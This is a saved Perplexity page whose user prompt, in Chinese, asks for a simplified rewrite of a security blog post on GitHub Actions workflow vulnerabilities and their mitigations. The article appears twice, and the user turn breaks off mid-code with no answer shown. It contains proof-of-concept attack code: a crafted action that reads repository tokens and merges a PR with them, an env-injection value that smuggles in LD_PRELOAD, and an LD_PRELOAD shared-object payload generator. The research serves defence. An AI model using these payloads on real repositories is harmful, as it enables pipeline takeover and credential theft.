---
title: 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。 ------------ Call for action: Exploring vulnerabilities in Github Actions Written by: Elliot Ward Elliot Ward Rory McNamara Rory McNamara Raul Onitza-Klugman Raul Onitza-Klugman June 6, 2024 28 mins read To address the need for streamlined code changes and rapid feature delivery, CI/CD solutions have become essential. Among these solutions, GitHub Actions, launched in 2018, has quickly garnered significant attention from the security community. Notable findings have been published by companies like Cycode and Praetorian and security researchers such as Teddy Katz and Adnan Khan. Our recent investigation reveals that vulnerable workflows continue to emerge in prominent repositories from organizations like Microsoft (including Azure), HashiCorp, and more. In this blog post, we will provide an overview of GitHub Actions, examine various vulnerable scenarios with real-world examples, offer clear guidance on securely using error-prone features, and introduce an open source tool designed to scan configuration files and flag potential issues. Github Actions overview GitHub Actions is a powerful CI/CD solution that enables the automation of workflows in response to specific triggers. Each workflow consists of a set of jobs executed on either GitHub-hosted or self-hosted runner virtual machines. These jobs are composed of steps, where each step can execute a script or an Action — a reusable unit hosted on the GitHub Actions Marketplace or any GitHub repository. Actions come in three forms: Docker: Executes a Docker image hosted on Docker Hub inside a container. JavaScript: Runs a Node.js application directly on the host machine. Composite: Combines multiple steps into a single action. Workflows are defined using YAML files located in a repository’s .github/workflows directory. Here is a basic example: name: Base Workflow on: pull_request: jobs: whoami: name: I'm base runs-on: ubuntu-latest steps: - run: echo "I'm base" Each workflow should include a name directive for reference, an on clause to specify triggers (such as the creation, modification, or closure of a pull request), and a jobs section that defines the jobs to be executed. Jobs run concurrently unless otherwise specified through conditional if statements. Refer to the official documentation for more detailed information on GitHub Actions and how to create them. Authentication and secrets in GitHub Actions GitHub Actions automatically generates a GITHUB_TOKEN secret at the start of each workflow. This token is used to authenticate the workflow and manage its permissions. The token’s permissions can be applied globally across all jobs in a workflow or configured separately for each job. The GITHUB_TOKEN is crucial as it allows users to modify repository contents directly or interact with the GitHub API to perform privileged actions. Additionally, GitHub Actions supports passing secrets to a job. Secrets are sensitive values defined in the project settings used for operations like authenticating to third-party services or accessing external APIs. If an attacker gains access to a secret, they could potentially extend the impact of an attack beyond GitHub Actions. Here's an example of a job using a secret: name: Base Workflow on: pull_request: jobs: use-secret: name: I'm using a secret env: MY_SECRET: ${{ secrets.MY_SECRET }} runs-on: ubuntu-latest steps: - run: command --secret “$MY_SECRET” As we’ve covered the basics, let’s dig deeper and see cases where misconfigured or outright vulnerable workflows can have security implications. Vulnerable scenarios One particularly problematic feature in GitHub Actions is the handling of forked repositories. Forking allows developers to add features to repositories for which they lack write permissions by creating a copy of the repository, complete with its entire history, under the user's namespace. Developers can then work on this forked repository, create branches, push code changes, and eventually open a pull request back to the upstream repository (also known as the "base"). After an upstream maintainer reviews and approves the pull request (PR), the changes can be merged into the base repository. In the context of a forked repository (referred to as "the context of the merge commit" in GitHub documentation), the user has complete control, and there are no restrictions on who can fork a repository. This creates a security boundary that GitHub is aware of. For example, the pull_request event is recommended for PRs originating from forks, as it doesn't have access to the base repository's context and secrets. Conversely, the pull_request_target event has full access to the base repository’s context and secrets and often includes read/write permissions to the repository. Suppose this event does not validate inputs such as branch names, PR bodies, and artifacts originating from the fork. In that case, it can compromise the security boundary, potentially leading to hazardous effects on the workflow. To help settle the confusion between the pull_request_target and pull_request triggers, here’s a table with the key differences: pull_request pull_request_target Context of execution forked repo base repo Secrets ⛔ ✅ Default GITHUB_TOKENpermissions READ READ/WRITE Pwn request A "Pwn Request" scenario occurs when a workflow mishandles the pull_request_target trigger, potentially compromising the GITHUB_TOKEN and leaking secrets. Three specific conditions must be met for this issue to be exploitable: Workflow triggered by pull_request_target event: The pull_request_target event runs in the context of the base of the pull request, not in the context of the merge commit, as the pull_request event does. This means that the workflow will execute the code in the context of the upstream repository, which a user of the forked repository should not have access to. Consequently, the GITHUB_TOKEN is typically granted write permissions. The pull_request_target event is intended to be used with safe upstream code, hence an additional condition is needed to break this boundary. Explicit checkout from the forked repository: - uses: actions/checkout@v2 with: ref: ${{ github.event.pull_request.head.sha }} Note: github.event.pull_request.head.ref is also a dangerous option. The ref clause points to the forked repository, and checking it out means the job will run code fully controlled by an attacker. Code execution or injection point: This is where the damage occurs. Suppose an attacker has complete control over the checked-out code. In that case, they can replace any script that gets executed in subsequent steps with a malicious version, modify a configuration file with command execution potential (e.g., package.json used by npm install), or exploit a command injection vulnerability within a step to execute arbitrary code. The extent of the damage depends on how the permissions are configured and whether there are any secrets that can be leaked to compromise additional services. Since the GITHUB_TOKEN's lifecycle is limited to the currently running workflow, an attacker must craft the exploit to run within that window. For a deep dive into how secrets can be leaked from GitHub Actions, refer to Karim Rahal’s excellent write-up. workflow_run privilege escalation The workflow_run trigger in GitHub Actions is designed to run workflows sequentially rather than concurrently — starting one workflow after completing another. However, the subsequent workflow is executed with write permissions and access to secrets, even if the triggering workflow does not have such privileges. This creates a potential security risk similar to those previously discussed. How can an attacker exploit these elevated privileges? Control over the triggering workflow: The triggering workflow must be completed successfully and controlled by the attacker. For instance, this workflow can be triggered by the pull_request event, which runs in the context of the merge (or forked) repository and is intended to run unsafe code. Workflow triggered with workflow_run: A subsequent workflow must be triggered by the workflow_run event and explicitly check out the unsafe code from the forked repository: - uses: actions/checkout@v4 with: repository: ${{ github.event.workflow_run.head_repository.full_name }} ref: ${{ github.event.workflow_run.head_sha }} fetch-depth: 0 Notice the repository and ref input variables pointing to the attacker-controlled code. This code is now granted elevated privileges for the workflow_run event, leading to privilege escalation. Code execution or injection point: Similar to previous scenarios, an attacker needs a code execution or injection point in order to take over the triggered workflow. Unsafe artifact download As we’ve seen in the case of pull_request_target and workflow_run, running workflows with read-write privileges to an upstream repo on untrusted code can be hazardous. According to official Github docs, it’s recommended to split the workflow into two: one that does unsafe operations, such as running build commands on a low-privileged workflow, and one that consumes the output artifacts and performs privileged operations, such as commenting on the PR. By itself, this is perfectly safe, but what happens if the privileged workflow uses the artifact unsafely? Let’s take a look at the following example. upload.yml: name: Upload on: pull_request: jobs: test-and-upload: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Run tests Run: npm install - name: Store PR information if: ${{ github.event_name == 'pull_request' }} run: | echo ${{ github.event.number }} > ./pr.txt - name: Upload PR information if: ${{ github.event_name == 'pull_request' }} uses: actions/upload-artifact@v4 with: name: pr path: pr.txt download.yml: jobs: download: runs-on: ubuntu-latest if: github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success' steps: - uses: actions/download-artifact@v4 with: name: pr path: ./pr.txt - name: Echo PR num run: | PR=$(cat ./pr.txt) echo "PR_NO=${PR}" >> $GITHUB_ENV An attacker can create a PR that replaces package.json with a crafted one to execute arbitrary code in the npm install step and trigger the upload workflow. They can add a preinstall script that sets LD_PRELOAD to replace the pr.txt file with a malicious one like 1\nLD_PRELOAD=[ATTACKER_SHARED_OBJ]. When this file is read in the download workflow, the LD_PRELOAD payload will be injected into GITHUB_ENV in the echo command. If an attacker can also download a shared object, e.g., by downloading a second artifact they control, the entire privileged workflow can be compromised. Self-hosted runners Github Actions provides hosted ephemeral runners to execute workflows. If a user wishes, they can set up a self-hosted runner over which they have full control. This doesn’t come without a price — if it gets compromised, an attacker can persist on the runner and infiltrate other workflows running on the same host and other hosts on the internal network. When these runners are configured in public repos, they increase the attack surface as they can execute code that doesn’t only originate from the repo maintainers and trusted developers. A detailed exploration of this vector can be found in Adnan Khan’s blog. Vulnerable actions Actions are also a viable attack vector to compromise a workflow. Since Actions are hosted on Github, taking over one can trigger a supply-chain attack on all the workflows that depend on it. But one does not have to go that far — actions are just scripts often running directly on the runner host (and sometimes inside Docker containers). They receive data from the calling job through inputs and can access the global Github context and secrets. Essentially, whatever a calling workflow can do, a callee Action can also do it. If an Action contains a “classical” vulnerability, such as a command injection and an attacker that can trigger it with some input they control, they can take over the entire workflow. Exploit techniques Once a vulnerable workflow is discovered, the next question is, can it be exploited with a meaningful impact? Here are a couple of techniques we’ve found useful: Code or command injection in a step: In the case, an attacker has control over the contents of a pull request, e.g., when a workflow triggers on pull_request_target, they can achieve arbitrary code execution in a handful of ways, including: Taking over a package manager install command — the most common example that comes to mind is adding a preinstall or postinstall script in a package.json file that will be executed in an npm install command. Of course, this is not limited to Node.js, as package managers have similar features in other ecosystems as well. For more examples, check out the Living-Off-The-Pipeline page. Taking over an action hosted on the same repo — Actions can be hosted on any Github repo, including the one that contains the workflow. When the step’s uses clause starts with ./, the code is contained in a subfolder within the repo. Replacing the action.yml file or one of the source files that will run, e.g., the index.js file in JavaScript, will run the code injected by the attacker. Using env var injection to set LD_PRELOAD: Github already considers environment variable injection a threat, hence limiting the ones a user can set. For instance, additional cli args can be provided to the node binary through the NODE_OPTIONS env var. If not restricted, an attacker could inject payload into that env var, which would lead to command execution. As a result, Github prevents NODE_OPTIONS from being set in a workflow, as detailed here. One env var that is not restricted is LD_PRELOAD. LD_PRELOAD points to a shared object loaded by the Linux dynamic linker into the process memory before all others do. This allows function hooking, e.g., overwriting function calls with custom code mainly used for instrumentation. By overwriting a syscall like open() or write() used in filesystem operations, an attacker can inject code that’ll get executed from the point of injection and on. To illustrate some of these techniques, let's look at a real-world example. terraform-cdk-action Pwn request The terraform-cdk-action repo contains an action created by Terraform. Compromising the Github Actions workflow of this kind of repo is particularly dangerous as modifications to the action can further compromise workflows depending on it. The vulnerability exists in the integration-tests.yml workflow: pull_request_target: << This triggers the workflow types: - opened - ready_for_review - reopened - synchronize ... integrations-tests: needs: prepare-integration-tests runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 with: ref: ${{ github.event.pull_request.head.ref }} << Unsafe checkout from fork repository: ${{ github.event.pull_request.head.repo.full_name }} ... - name: Install Dependencies run: cd test-stacks && yarn install << This installs the attackers ‘package.json’ - name: Integration Test - Local uses: ./ << This runs the local action, from within the PR with: workingDirectory: ./test-stacks stackName: "test-stack" mode: plan-only githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen commentOnPr: false - name: Integration Test - TFC uses: ./ << This runs the local action, from within the PR with: workingDirectory: ./test-stacks stackName: "test-stack" mode: plan-only terraformCloudToken: ${{ secrets.TF_API_TOKEN }} << This token can be stolen githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen commentOnPr: false This workflow is used to test the action within its own repo. Looking into the action.yml file, we can see that the index.ts (compiled to JavaScript) is the main file that gets executed: name: terraform-cdk-action description: The Terraform CDK GitHub Action allows you to run CDKTF as part of your CI/CD workflow. runs: using: node20 main: dist/index.js The workflow references it in the uses: ./ clause. Hence, all we need to do is modify it, and it’ll be executed. Here’s a look at the crafted index.ts: import * as core from "@actions/core"; import { run } from "./action"; import { execSync } from 'child_process'; console.log("\r\nPwned action..."); console.log(execSync('id').toString()); const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("-")).toString('base64'); const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("-")).toString('base64'); console.log('Testing token...'); const str = `# Merge PR curl -X PUT \ https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/2/merge \ -H "Accept: application/vnd.github.v3+json" \ --header "authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}" \ --header 'content-type: application/json' \ -d '{"commit_title":"pwned"}'`; execSync(str, { stdio: 'inherit' }); run().catch((error) => { core.setFailed(error.message); }); We tested this on a copy of the original repo, so we won’t tamper with it. Since the pull_request_target trigger has write permissions to the base repo by default and it wasn’t restricted in any way or fashion, we were able to merge a PR with the compromised token successfully: And we can see that the PR was successfully merged by the github-actions[bot]: How to secure your pipelines Securing Github Actions workflows depends on the implementation, and that can vary significantly. Different trigger scenarios require different safeguards. Let’s explore the various issues we’ve detailed and offer potential ways to mitigate them with some concrete examples for reference. Avoid running privileged workflows on untrusted code — when using the pull_request_target or workflow_run triggers, do not checkout code from forked repos unless you have to. Meaning - ref shouldn’t point to the likes of github.event.pull_request.head.ref or github.event.workflow_run.head_sha. Since these triggers run in the context of the base repo with read/write permissions granted to the GITHUB_TOKEN by default and access to secrets, compromising these workflows is especially dangerous. If checking out the code is a must, here are some additional safety measures: Validate the triggering repo/user: Add an if condition to the checkout step to limit the triggering party: jobs: validate_email: permissions: pull-requests: write runs-on: ubuntu-latest if: github.repository == 'llvm/llvm-project' steps: - name: Fetch LLVM sources uses: actions/checkout@v4 with: ref: ${{ github.event.pull_request.head.sha }} Taken from llvm/llvm-project. Notice the if condition that checks if the triggering Github repo is the base repo, thus blocking PRs triggered by forks. Here’s another example, this time by checking that the user that created the PR is a trusted one: jobs: merge-dependabot-pr: runs-on: ubuntu-latest if: github.actor == 'dependabot[bot]' steps: - uses: actions/checkout@v4 with: show-progress: false ref: ${{ github.event.pull_request.head.sha }} In spring-projects/spring-security, github.actor is checked for Dependabot, thus blocking PRs originating from other users from running the job. Run the workflow only after manual validation: This can be done by adding a label to the PR. name: Benchmark on: pull_request_target: types: [labeled] jobs: benchmark: if: ${{ github.event.label.name == 'benchmark' }} runs-on: ubuntu-latest ... steps: - uses: actions/checkout@v4 with: persist-credentials: false ref: ${{github.event.pull_request.head.sha}} repository: ${{github.event.pull_request.head.repo.full_name}} This example taken from fastify/fastify shows a workflow triggered by a PR only when it’s labeled with “benchmark.” These if-condition statements can be applied both on the job and on a specific step level. Check that the triggering repo matches the base repo: This is another way to restrict PRs originating from forked repos. For a workflow that triggers on pull_request_target, let’s look at the following if condition: jobs: deploy: name: Build & Deploy runs-on: ubuntu-latest if: > (github.event_name == 'pull_request_target' && contains(github.event.pull_request.labels.*.name, 'impact/docs')) || (github.event_name != 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) As can be seen in python-poetry/poetry, notice the check that github.event.pull_request.head.repo.full_name coming from the PR event context matches the base repo github.repository. Similarly, for a workflow that triggers on workflow_run, this will look like: jobs: publish-latest: runs-on: ubuntu-latest if: ${{ (github.event.workflow_run.conclusion == 'success') && (github.event.workflow_run.head_repository.full_name == github.repository) }} As demonstrated in TwiN/gatus. Treat actions the same as you would 3rd-party dependencies. Anyone familiar with the open source world and developer security hopefully knows by now the dangers of using packages stored in public code registries. Actions are the Github Actions’ dependency counterpart. If you’re using one, make sure to vet the repo that stores it. Once done, you can pin the action to a commit hash (a version tag is not good enough) to make sure that Github Actions will not pull a new version of it once it’s updated. This ensures that if the action gets compromised, you won’t suffer the consequences. An action can be pinned by using the @ sign after the action’s name: steps: - uses: actions/checkout@9bb56186c3b09b4f86b1c65136769dd318469633 # v4.1.2 Handling untrusted artifacts in Github Actions: Artifacts generated by workflows running on untrusted code should be treated with the same caution as user-controlled code, as they can potentially serve as an entry point for attackers into a privileged workflow. To mitigate this risk, when downloading artifacts using the github/download-artifact action, always specify a path parameter. This ensures the contents are extracted to a designated directory, preventing any accidental overwriting of files in the job’s root directory that could later be executed in a privileged context. Additionally, developers should ensure that the contents of these artifacts are properly escaped and sanitized before being used in any sensitive operations. By taking these precautions, you can significantly reduce the risk of introducing vulnerabilities through untrusted artifacts. Restrict the code that runs on self-hosted runners: By default, PRs coming from forked repos need approval to execute workflows if the owner is a first-time contributor to the repo. If they’ve already contributed code, in as little as fixing a typo, the workflows will run automatically on their PRs. Obviously, this is an easy hurdle to pass, so the first recommendation is to set that setting to require approval for all external contributors: There’s also a hardening tool by step-security/harden-runner designed to be the first step in any job in a workflow. A word of caution - hardening RCE-as-a-service solutions is not an easy task to accomplish so using this might not be without risk. Adhering to the least privilege principle: In the worst case, a workflow gets compromised, an attacker can run arbitrary code. Restricting the permissions of the GITHUB_TOKEN can be the last line of defense preventing an attacker from fully taking over a repo. This can be done globally in the repo’s settings, for each workflow, or even for jobs in the YAML config file. Special attention should be given to workflows that trigger on events like pull_request_target and workflow_run that have full read/write access to the base repo by default. Community tool: Github Actions scanner In order to scan issues in your Github Actions workflows and actions, we created a CLI tool — Github Actions Scanner. Given a Github repo or an org, it’ll parse all the YAML config files and use a regex-based rule engine to flag findings. It also has features that can facilitate exploitation: Auto creation of a copy of the target repo: If an issue is found and requires some additional validation or developing an exploit, we don’t want to do this on the target repo to avoid affecting the actual code and the risk of exposing the issue before it was responsibly disclosed and fixed. As a result, we can create a fresh copy of the repo on a Github user or org of choice to perform isolated testing. LD_PRELOAD payload generation: When command injection is possible, using LD_PRELOAD to compromise subsequent steps is usually a great way to take over a workflow. Thus, we have created a proof-of-concept (POC) generator based on the following template: const ldcode = Buffer.from(`#include <stdlib.h> void __attribute__((constructor)) so_main() { unsetenv("LD_PRELOAD"); system("${command.replace("\"", "\\\"")}"); } `) const code = Buffer.from(`echo ${ldcode.toString("base64")} | base64 -d | cc -fPIC -shared -xc - -o $GITHUB_WORKSPACE/ldpreload-poc.so; echo "LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so" >> $GITHUB_ENV`) It implements the following steps: Create a small Base64 encoded C program that invokes the system syscall on a command specified by the user. Decode and compile it to a shared object in the $GITHUB_WORKSPACE root dir. Set LD_PRELOAD to the shared object and load it into the GITHUB_ENV. Conclusion In this research, we provided an overview of Github Actions-related vulnerabilities and security hazards. Due to the multitude of options and the need for clarity in the official documentation, developers are still getting these wrong, resulting in compromised CI/CD pipelines. Make no mistake, misconfigured and outright vulnerable workflows are not unique to Github Actions, and special care must be taken to secure them. As modern supply chain scanners and static analyzers still can fail to detect these, developers must adhere to safe best practices. We created an open source tool to help fill in the gaps and flag potential issues. As more research is done in this area, this blog and others can help drive the developers’ focus and educate them so that the occurrence of these bugs diminishes
date: 2025-02-09
source: https://www.perplexity.ai/search/shi-yong-zui-jian-dan-de-biao-0DFnnAv4TtupHS024idCvg
---

**User:** 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。

------------
Call for action: Exploring vulnerabilities in Github Actions
Written by:
Elliot Ward
Elliot Ward

Rory McNamara
Rory McNamara

Raul Onitza-Klugman
Raul Onitza-Klugman

June 6, 2024

28 mins read
To address the need for streamlined code changes and rapid feature delivery, CI/CD solutions have become essential. Among these solutions, GitHub Actions, launched in 2018, has quickly garnered significant attention from the security community. Notable findings have been published by companies like Cycode and Praetorian and security researchers such as Teddy Katz and Adnan Khan. Our recent investigation reveals that vulnerable workflows continue to emerge in prominent repositories from organizations like Microsoft (including Azure), HashiCorp, and more. In this blog post, we will provide an overview of GitHub Actions, examine various vulnerable scenarios with real-world examples, offer clear guidance on securely using error-prone features, and introduce an open source tool designed to scan configuration files and flag potential issues.

Github Actions overview
GitHub Actions is a powerful CI/CD solution that enables the automation of workflows in response to specific triggers. Each workflow consists of a set of jobs executed on either GitHub-hosted or self-hosted runner virtual machines. These jobs are composed of steps, where each step can execute a script or an Action — a reusable unit hosted on the GitHub Actions Marketplace or any GitHub repository.

Actions come in three forms:

Docker: Executes a Docker image hosted on Docker Hub inside a container.

JavaScript: Runs a Node.js application directly on the host machine.

Composite: Combines multiple steps into a single action.

Workflows are defined using YAML files located in a repository’s .github/workflows directory. Here is a basic example:

name: Base Workflow
on:
  pull_request:

jobs:
  whoami:
    name: I'm base
    runs-on: ubuntu-latest
    steps:
      - run: echo "I'm base"
Each workflow should include a name directive for reference, an on clause to specify triggers (such as the creation, modification, or closure of a pull request), and a jobs section that defines the jobs to be executed. Jobs run concurrently unless otherwise specified through conditional if statements.

Refer to the official documentation for more detailed information on GitHub Actions and how to create them.

Authentication and secrets in GitHub Actions
GitHub Actions automatically generates a GITHUB_TOKEN secret at the start of each workflow. This token is used to authenticate the workflow and manage its permissions. The token’s permissions can be applied globally across all jobs in a workflow or configured separately for each job. The GITHUB_TOKEN is crucial as it allows users to modify repository contents directly or interact with the GitHub API to perform privileged actions.

Additionally, GitHub Actions supports passing secrets to a job. Secrets are sensitive values defined in the project settings used for operations like authenticating to third-party services or accessing external APIs. If an attacker gains access to a secret, they could potentially extend the impact of an attack beyond GitHub Actions. Here's an example of a job using a secret:

name: Base Workflow
on:
  pull_request:

jobs:
  use-secret:
    name: I'm using a secret
    env:
      MY_SECRET: ${{ secrets.MY_SECRET }}
    runs-on: ubuntu-latest
    steps:
      - run: command --secret “$MY_SECRET”
As we’ve covered the basics, let’s dig deeper and see cases where misconfigured or outright vulnerable workflows can have security implications.

Vulnerable scenarios
One particularly problematic feature in GitHub Actions is the handling of forked repositories. Forking allows developers to add features to repositories for which they lack write permissions by creating a copy of the repository, complete with its entire history, under the user's namespace. Developers can then work on this forked repository, create branches, push code changes, and eventually open a pull request back to the upstream repository (also known as the "base"). After an upstream maintainer reviews and approves the pull request (PR), the changes can be merged into the base repository.

In the context of a forked repository (referred to as "the context of the merge commit" in GitHub documentation), the user has complete control, and there are no restrictions on who can fork a repository. This creates a security boundary that GitHub is aware of. For example, the pull_request event is recommended for PRs originating from forks, as it doesn't have access to the base repository's context and secrets.

Conversely, the pull_request_target event has full access to the base repository’s context and secrets and often includes read/write permissions to the repository. Suppose this event does not validate inputs such as branch names, PR bodies, and artifacts originating from the fork. In that case, it can compromise the security boundary, potentially leading to hazardous effects on the workflow.

To help settle the confusion between the pull_request_target and pull_request triggers, here’s a table with the key differences:

pull_request

pull_request_target

Context of execution

forked repo

base repo

Secrets

⛔

✅

Default GITHUB_TOKENpermissions

READ

READ/WRITE

Pwn request
A "Pwn Request" scenario occurs when a workflow mishandles the pull_request_target trigger, potentially compromising the GITHUB_TOKEN and leaking secrets. Three specific conditions must be met for this issue to be exploitable:

Workflow triggered by pull_request_target event: The pull_request_target event runs in the context of the base of the pull request, not in the context of the merge commit, as the pull_request event does. This means that the workflow will execute the code in the context of the upstream repository, which a user of the forked repository should not have access to. Consequently, the GITHUB_TOKEN is typically granted write permissions. The pull_request_target event is intended to be used with safe upstream code, hence an additional condition is needed to break this boundary.

Explicit checkout from the forked repository:

- uses: actions/checkout@v2
	with:
		ref: ${{ github.event.pull_request.head.sha }}
Note: github.event.pull_request.head.ref is also a dangerous option. The ref clause points to the forked repository, and checking it out means the job will run code fully controlled by an attacker.

Code execution or injection point: This is where the damage occurs. Suppose an attacker has complete control over the checked-out code. In that case, they can replace any script that gets executed in subsequent steps with a malicious version, modify a configuration file with command execution potential (e.g., package.json used by npm install), or exploit a command injection vulnerability within a step to execute arbitrary code. The extent of the damage depends on how the permissions are configured and whether there are any secrets that can be leaked to compromise additional services. Since the GITHUB_TOKEN's lifecycle is limited to the currently running workflow, an attacker must craft the exploit to run within that window.

For a deep dive into how secrets can be leaked from GitHub Actions, refer to Karim Rahal’s excellent write-up.

workflow_run privilege escalation
The workflow_run trigger in GitHub Actions is designed to run workflows sequentially rather than concurrently — starting one workflow after completing another. However, the subsequent workflow is executed with write permissions and access to secrets, even if the triggering workflow does not have such privileges. This creates a potential security risk similar to those previously discussed. How can an attacker exploit these elevated privileges?

Control over the triggering workflow: The triggering workflow must be completed successfully and controlled by the attacker. For instance, this workflow can be triggered by the pull_request event, which runs in the context of the merge (or forked) repository and is intended to run unsafe code.

Workflow triggered with workflow_run: A subsequent workflow must be triggered by the workflow_run event and explicitly check out the unsafe code from the forked repository:

- uses: actions/checkout@v4
  with:
    repository: ${{ github.event.workflow_run.head_repository.full_name }}
    ref: ${{ github.event.workflow_run.head_sha }}
    fetch-depth: 0
Notice the repository and ref input variables pointing to the attacker-controlled code. This code is now granted elevated privileges for the workflow_run event, leading to privilege escalation.

Code execution or injection point: Similar to previous scenarios, an attacker needs a code execution or injection point in order to take over the triggered workflow.

Unsafe artifact download
As we’ve seen in the case of pull_request_target and workflow_run, running workflows with read-write privileges to an upstream repo on untrusted code can be hazardous. According to official Github docs, it’s recommended to split the workflow into two: one that does unsafe operations, such as running build commands on a low-privileged workflow, and one that consumes the output artifacts and performs privileged operations, such as commenting on the PR. By itself, this is perfectly safe, but what happens if the privileged workflow uses the artifact unsafely?

Let’s take a look at the following example.

upload.yml:

name: Upload

on:
  pull_request:

jobs:
  test-and-upload:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run tests
        Run: npm install
      - name: Store PR information
        if: ${{ github.event_name == 'pull_request' }}
        run: |
          echo ${{ github.event.number }} > ./pr.txt
      - name: Upload PR information
        if: ${{ github.event_name == 'pull_request' }}
        uses: actions/upload-artifact@v4
        with:
          name: pr
          path: pr.txt
download.yml:

jobs:
  download:
    runs-on: ubuntu-latest
    if:
      github.event.workflow_run.event == 'pull_request' &&
      github.event.workflow_run.conclusion == 'success'
    steps:
    - uses: actions/download-artifact@v4
      with:
        name: pr
        path: ./pr.txt
    - name: Echo PR num
        run: |
          PR=$(cat ./pr.txt)
          echo "PR_NO=${PR}" >> $GITHUB_ENV
An attacker can create a PR that replaces package.json with a crafted one to execute arbitrary code in the npm install step and trigger the upload workflow. They can add a preinstall script that sets LD_PRELOAD to replace the pr.txt file with a malicious one like 1\nLD_PRELOAD=[ATTACKER_SHARED_OBJ]. When this file is read in the download workflow, the LD_PRELOAD payload will be injected into GITHUB_ENV in the echo command. If an attacker can also download a shared object, e.g., by downloading a second artifact they control, the entire privileged workflow can be compromised.

Self-hosted runners
Github Actions provides hosted ephemeral runners to execute workflows. If a user wishes, they can set up a self-hosted runner over which they have full control. This doesn’t come without a price — if it gets compromised, an attacker can persist on the runner and infiltrate other workflows running on the same host and other hosts on the internal network. When these runners are configured in public repos, they increase the attack surface as they can execute code that doesn’t only originate from the repo maintainers and trusted developers. A detailed exploration of this vector can be found in Adnan Khan’s blog.

Vulnerable actions
Actions are also a viable attack vector to compromise a workflow. Since Actions are hosted on Github, taking over one can trigger a supply-chain attack on all the workflows that depend on it. But one does not have to go that far — actions are just scripts often running directly on the runner host (and sometimes inside Docker containers). They receive data from the calling job through inputs and can access the global Github context and secrets. Essentially, whatever a calling workflow can do, a callee Action can also do it. If an Action contains a “classical” vulnerability, such as a command injection and an attacker that can trigger it with some input they control, they can take over the entire workflow. 

Exploit techniques
Once a vulnerable workflow is discovered, the next question is, can it be exploited with a meaningful impact? Here are a couple of techniques we’ve found useful:

Code or command injection in a step: In the case, an attacker has control over the contents of a pull request, e.g., when a workflow triggers on pull_request_target, they can achieve arbitrary code execution in a handful of ways, including:

Taking over a package manager install command — the most common example that comes to mind is adding a preinstall or postinstall script in a package.json file that will be executed in an npm install command. Of course, this is not limited to Node.js, as package managers have similar features in other ecosystems as well. For more examples, check out the Living-Off-The-Pipeline page. 

Taking over an action hosted on the same repo — Actions can be hosted on any Github repo, including the one that contains the workflow. When the step’s uses clause starts with ./, the code is contained in a subfolder within the repo. Replacing the action.yml file or one of the source files that will run, e.g., the index.js file in JavaScript, will run the code injected by the attacker.

Using env var injection to set LD_PRELOAD: Github already considers environment variable injection a threat, hence limiting the ones a user can set. For instance, additional cli args can be provided to the node binary through the NODE_OPTIONS env var. If not restricted, an attacker could inject payload into that env var, which would lead to command execution. As a result, Github prevents NODE_OPTIONS from being set in a workflow, as detailed here. One env var that is not restricted is LD_PRELOAD. LD_PRELOAD points to a shared object loaded by the Linux dynamic linker into the process memory before all others do. This allows function hooking, e.g., overwriting function calls with custom code mainly used for instrumentation. By overwriting a syscall like open() or write() used in filesystem operations, an attacker can inject code that’ll get executed from the point of injection and on.

To illustrate some of these techniques, let's look at a real-world example.

terraform-cdk-action Pwn request
The terraform-cdk-action repo contains an action created by Terraform. Compromising the Github Actions workflow of this kind of repo is particularly dangerous as modifications to the action can further compromise workflows depending on it. 

The vulnerability exists in the integration-tests.yml workflow:

pull_request_target: << This triggers the workflow
   types:
     - opened
     - ready_for_review
     - reopened
     - synchronize
...
integrations-tests:
 needs: prepare-integration-tests
 runs-on: ubuntu-latest
 steps:
   - name: Checkout
     uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
     with:
       ref: ${{ github.event.pull_request.head.ref }} << Unsafe checkout from fork
       repository: ${{ github.event.pull_request.head.repo.full_name }}
...
   - name: Install Dependencies
     run: cd test-stacks && yarn install << This installs the attackers ‘package.json’
   - name: Integration Test - Local
     uses: ./ << This runs the local action, from within the PR
     with:
       workingDirectory: ./test-stacks
       stackName: "test-stack"
       mode: plan-only
       githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen
       commentOnPr: false
   - name: Integration Test - TFC
     uses: ./ << This runs the local action, from within the PR
     with:
       workingDirectory: ./test-stacks
       stackName: "test-stack"
       mode: plan-only
       terraformCloudToken: ${{ secrets.TF_API_TOKEN }} << This token can be stolen
       githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen
       commentOnPr: false
This workflow is used to test the action within its own repo. Looking into the action.yml file, we can see that the index.ts (compiled to JavaScript) is the main file that gets executed:

name: terraform-cdk-action
description: The Terraform CDK GitHub Action allows you to run CDKTF as part of your CI/CD workflow.
runs:
  using: node20
  main: dist/index.js
The workflow references it in the uses: ./ clause. Hence, all we need to do is modify it, and it’ll be executed. Here’s a look at the crafted index.ts:

import * as core from "@actions/core";
import { run } from "./action";

import { execSync } from 'child_process';

console.log("\r\nPwned action...");
console.log(execSync('id').toString());

const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("-")).toString('base64');
const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("-")).toString('base64');

console.log('Testing token...');
